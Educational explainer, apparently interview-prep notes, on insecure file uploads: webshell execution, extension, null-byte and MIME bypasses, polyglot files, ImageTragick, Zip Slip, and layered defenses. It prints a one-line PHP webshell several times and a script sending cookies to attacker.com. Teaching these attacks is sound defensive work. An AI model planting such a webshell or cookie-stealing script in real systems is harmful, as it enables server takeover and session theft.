1. Why does uploading a .php file sometimes lead to remote code execution?
To understand this, we must understand how web servers handle files.
Most web servers like Apache HTTP Server or Nginx decide how to process a file based on its extension.
For example
photo.jpg  → return image
script.js  → return javascript
file.php   → execute via PHP interpreter

If an application allows uploading files into a directory that is served by the web server, an attacker may upload a file like:
shell.php
Example content:
<?php system($_GET['cmd']); ?>

The attacker uploads the file using the application.
Now imagine the upload path becomes accessible like this:
https://example.com/uploads/shell.php

When the attacker visits:
https://example.com/uploads/shell.php?cmd=id
The server does not treat it as a normal file.

Instead:
The web server sees .php
It sends the file to the PHP interpreter
The PHP code executes
The attacker now runs commands on the server.

So the key architectural mistake is:
User upload directory is executable by the web server
That is what turns file upload into remote code execution.

2. Why do simple file extension checks fail?
Many developers try to prevent malicious uploads with code like:
if filename ends with .jpg → allow
Attackers easily bypass this because filenames can contain multiple extensions.
Example:
shell.php.jpg

Some servers process files based on the first extension, others based on the last extension, and some frameworks mis-handle the parsing.

Another trick uses double extensions:
shell.php;.jpg
or
shell.php%00.jpg

The %00 represents a null byte, which historically caused some systems to stop parsing the string early.

Even if the extension check passes:
shell.php.jpg
the underlying server or interpreter might still detect .php.

The deeper lesson is:
File extension is user-controlled metadata
It does not reliably indicate file type.

3. Why is MIME-type validation not reliable?
Browsers send a header when uploading files:
Content-Type: image/jpeg
Many developers check this header to confirm the file type.
But this header is provided by the client.
Attackers can easily modify it using tools like Burp Suite.
Example upload request:
POST /upload
Content-Type: multipart/form-data
file: shell.php
Content-Type: image/jpeg

Even though the file contains PHP code, the header claims it is an image.
The server cannot trust this value.
To truly validate file types, the application must inspect file signatures, also called magic bytes.

For example, a real JPEG file begins with:
FF D8 FF
But attackers can even embed malicious code after valid image headers, creating something called a polyglot file.
So even signature validation alone is not always enough.

4. Why can image uploads still lead to code execution?
Many developers assume images are safe.
However, image processing libraries sometimes contain vulnerabilities.
For example, tools like ImageMagick process uploaded images.
If the application performs operations like:
• resize
• thumbnail generation
• format conversion
the file is passed to the image processing library.

Attackers may craft a malicious file that triggers a vulnerability in the library.

A famous example was the ImageTragick vulnerability, where specially crafted images caused the server to execute shell commands.
In this case:
User uploads image
        ↓
Application processes image
        ↓
Image library executes malicious payload
        ↓
Server compromise

So even when uploaded files are never directly executed, processing them can still lead to compromise.

5. Why can file uploads lead to stored XSS instead of RCE?
Not all insecure uploads lead to server compromise.
Sometimes the danger appears on the client side.
Imagine a website that allows users to upload files which other users can download or preview.
An attacker uploads an HTML file:
profile.html
Content:
<script>
fetch("https://attacker.com/steal?cookie="+document.cookie)
</script>

If the application serves this file with the header:
Content-Type: text/html
the browser executes it.

Now when another user views the uploaded file, the script runs in their browser.
This becomes Cross-Site Scripting.

The attack chain looks like this:
Attacker uploads malicious HTML
        ↓
Application stores file
        ↓
Another user opens file
        ↓
Browser executes script
        ↓
Session cookies stolen

So file uploads can lead to:
• Remote code execution
• XSS
• malware distribution
• data leakage
depending on how files are handled.

-> Where insecure file uploads appear in real systems:-
They commonly appear in features like:
• profile picture uploads
• document sharing systems
• HR resume portals
• cloud storage applications
• support ticket attachments
Any place where users can upload arbitrary files.

-> How modern systems mitigate insecure file uploads:
Secure systems apply multiple layers of defense.
• First, uploaded files should never be stored in directories where code execution is allowed.
Example architecture:
/uploads → static storage
/app → application code
• Second, file names should be randomized.
Instead of storing:
resume.pdf
the system generates:
a8f73c91.pdf
• Third, validate file types using content inspection, not just extensions or MIME types.
• Fourth, restrict file size and type to the minimum required.
• Fifth, if files must be served back to users, force safe headers:
Content-Disposition: attachment
This forces the browser to download the file rather than execute it.
• Finally, scanning uploads using antivirus tools or sandbox environments can detect malicious files.

-> The mental model that makes insecure file upload easy to remember:
Think of the vulnerability as a three-step chain:
User uploads file
        ↓
Server stores file
        ↓
Server or user processes file

If any step trusts the file too much, the attacker can exploit it.

6. How do you know if a directory is executable?
This depends on server configuration, not just the directory name.
Common indicators include:
a. Script interpreters enabled
Example for PHP:
AddHandler application/x-httpd-php .php
This tells the server:
Execute .php files

b. Application runtime directories
These usually execute scripts:
/var/www/html/
/srv/www/
/usr/share/nginx/html/

c. Framework deployment paths
Examples:
Node.js → /app
Django → /var/www/project
Java → /tomcat/webapps

7. Why uploads should never go inside application directories?
Bad architecture:
/var/www/html/uploads/
Because .php execution may be enabled here.

Safer architecture:
/opt/app/
/opt/uploads/
/opt/static/

Uploads stored outside the web root.
Then served through a separate mechanism.

Example secure pattern:
Application server
       │
       ▼
Upload stored in storage service
       │
       ▼
Served via static file server or CDN

-> Common storage services include:
Amazon S3
Google Cloud Storage

These services store files as data, not executable scripts.


Use Cases:

1. Double Extension Bypass:
Many applications validate uploads like this:
Allow only files ending with:
.jpg
.png
.gif
The developer checks the last extension of the filename.
But attackers can upload:
shell.php.jpg
At first glance the system sees:
.jpg
so it allows the file.
However, depending on how the server processes files, the real extension may still be interpreted as .php.

-> Attack flow:
Attacker uploads shell.php.jpg
        ↓
Server stores file
        ↓
Server interprets .php part
        ↓
PHP interpreter executes code

Some misconfigured servers treat any filename containing .php as executable.
So the attacker gets code execution.

2. Null Byte Injection:
This was historically one of the most powerful bypasses.
Example filename:
shell.php%00.jpg
%00 represents a null byte, which terminates strings in many C-based systems.
So the application validation sees:
shell.php%00.jpg
and thinks the extension is:
.jpg
But the underlying system may interpret it as:
shell.php
because the null byte terminates the string.
Even though modern frameworks fixed this, interviewers ask this question because it shows understanding of low-level string parsing.

3. MIME-Type Spoofing:
When browsers upload files they include a header:
Content-Type: image/jpeg
Developers sometimes trust this header.
But the header is fully controlled by the client.
Attackers modify it using tools like Burp Suite.
Example request:
POST /upload
file=shell.php
Content-Type: image/jpeg
The application believes it received an image.
But the file actually contains:
<?php system($_GET['cmd']); ?>
This works because HTTP headers are not trustworthy for validation.

4. Magic Byte Forgery:
Better systems validate file signatures, also called magic bytes.
Example:
JPEG files start with:
FF D8 FF
PNG files start with:
89 50 4E 47
Attackers bypass this by embedding these bytes at the beginning of a malicious file.
Example structure:
FF D8 FF
<?php system($_GET['cmd']); ?>
Now the file looks like a valid JPEG to simple validators.
But when the server interprets the file as PHP, the code executes.
This works because many validators only check the first few bytes.

5. Polyglot Files:
A polyglot file is a file that is valid in two different formats at the same time.
For example, the same file can be:
A valid image
AND
A valid script

Both parsers understand it.
That’s why polyglots are powerful in Unrestricted File Upload attacks.

i. First understand how normal files work:
Different programs read files differently.
Example:
An image viewer reads the file as:
JPEG structure

A PHP interpreter reads the file as:
PHP code

Each program only cares about the parts it understands.
Everything else is ignored.

ii. Key trick behind polyglots:
Programs do not parse the entire file strictly.
They usually:
• Look for a header
• Process what they understand
• Ignore the rest
This means a file can contain two formats layered together.

iii. Example of a JPEG + PHP polyglot:
A JPEG image begins with a specific signature:
FF D8 FF
A malicious polyglot might look like this:
FF D8 FF
<image data>
<?php system($_GET['cmd']); ?>

To an image viewer:
• Reads JPEG header
• Displays image
• Ignores the PHP code

To the PHP interpreter:
• Ignores the JPEG bytes
• Executes the PHP code

So the same file behaves as two different file types depending on who reads it.

iv. Why this bypasses upload protections:
Imagine an application only checks:
File signature

It verifies:
Does file start with JPEG magic bytes?
The answer is yes.
So the upload is allowed.
But the file actually contains:
Executable PHP code

If the server executes .php files, the attacker gets **Remote Code Execution.

v. Real attack scenario:
Suppose a website allows profile picture uploads.
The application allows:
.jpg
.png

Attacker uploads:
profile.jpg

But the file actually contains:
Valid JPEG
+
PHP webshell

If the file ends up in:
/var/www/uploads/profile.jpg

and the attacker accesses:
https://site.com/uploads/profile.jpg

Some misconfigured servers may still pass the file to the **PHP interpreter.
Then the attacker can run commands like:
?cmd=id

To the image viewer it appears as a normal image.
But to the PHP interpreter it contains executable code.

This technique bypasses:
• extension checks
• MIME checks
• file signature checks
Because the file is technically valid in both formats.

vi. Why this happens technically:
Three reasons:
1. File formats allow extra data:
Many formats allow unused data.
Example:
JPEG metadata
comments
padding

Attackers hide code there.

2. Parsers ignore unknown sections:
Programs ignore parts they do not understand.

3. Script interpreters ignore non-code:
PHP ignores everything outside <?php ?>.
Example:
random bytes
<?php malicious code ?>
random bytes

Only the PHP block runs.

vii. Famous real-world polyglots:
Attackers commonly create combinations like:
JPEG + PHP
GIF + PHP
PDF + JavaScript
ZIP + HTML
These appear harmless but contain executable payloads.

viii. Why modern systems still worry about polyglots:
Even if the server doesn't execute them, polyglots can trigger:
• Stored XSS
• Image parser vulnerabilities
• Antivirus bypass
• Content scanning bypass

ix. How secure systems defend against polyglots:
Secure architectures usually do multiple things:
1. Rename uploaded files
user.jpg → 91ac8f7c.dat

2. Store files outside web root
/data/uploads/

3. Re-encode images
Instead of storing the uploaded file, the server:
Decode image
Rebuild image
Save new image

This removes hidden payloads.

6. Case Sensitivity Bypass:
Some systems validate extensions like:
if extension == ".php"
But file systems may treat uppercase differently.
Attackers upload:
shell.PHP
shell.PhP
shell.pHp
If validation is case-sensitive but execution is case-insensitive, the file may still execute.
Example:
Validation rejects ".php"
But allows ".PHP"
Yet the server still executes .PHP.

7. Directory Traversal During Upload:
Sometimes the vulnerability is not just the file type but where the file is stored.
Attackers manipulate the filename like this:
../../shell.php
If the application concatenates paths incorrectly:
/uploads/ + filename
the resulting path becomes:
/var/www/uploads/../../shell.php
Which resolves to:
/var/www/shell.php
Now the file lands in the web root, which may be executable.
This combines file upload with path traversal.

8. Archive Upload Exploits (Zip Slip):
Some systems allow uploading archives:
.zip
.tar
The server extracts them automatically.
Attackers craft an archive with paths like:
../../shell.php
When the server extracts the archive, the file escapes the intended directory.
Example extraction:
Archive entry:
../../shell.php

Result:
/var/www/shell.php
The attacker just uploaded a file outside the intended upload folder.
This attack is known as Zip Slip.

-> Why these bypasses succeed:
They exploit different trust boundaries:
• User-controlled filename
• User-controlled headers
• File format ambiguity
• Parser behavior
• Server configuration
• Filesystem behavior
Developers usually secure only one layer, but attackers exploit another layer.

-> Real-world file upload attack chain:-
Many incidents combine multiple bypasses:

Attacker uploads polyglot image
        ↓
Magic byte validation passes
        ↓
File stored in executable directory
        ↓
Access file via URL
        ↓
PHP interpreter executes payload
Result: full server compromise.

-> How secure systems prevent these bypasses:-
Modern architectures prevent these attacks using layered defenses:
	1. Store uploads outside executable directories.
	2. Generate random filenames.
        Example:
        uploads/9f8c71a2.dat
	3. Validate file content using deep inspection.
	4. Strip dangerous metadata.
	5. Serve files with safe headers.
        Example:
        Content-Disposition: attachment
	6. Process files inside sandboxed environments.

-> Why insecure file upload is so dangerous:
Because it can lead to multiple types of attacks depending on the system architecture.
• Upload → stored in executable path → Remote Code Execution
• Upload → processed by vulnerable library → Server compromise
• Upload → served to users → Stored XSS

This is why the vulnerability is so commonly exploited in real systems.

-> A mental model that helps remember this:
Whenever you see file upload in threat modeling, ask three questions:
1. Where is the file stored?
2. Who processes the file?
3. Who opens the file later?
Each of these stages introduces a different risk.
-> Whenever you see file upload, ask:
Where is the file stored?
If the answer is: Inside web server document root
then there is potential risk.
Because:
URL → server → filesystem → script execution
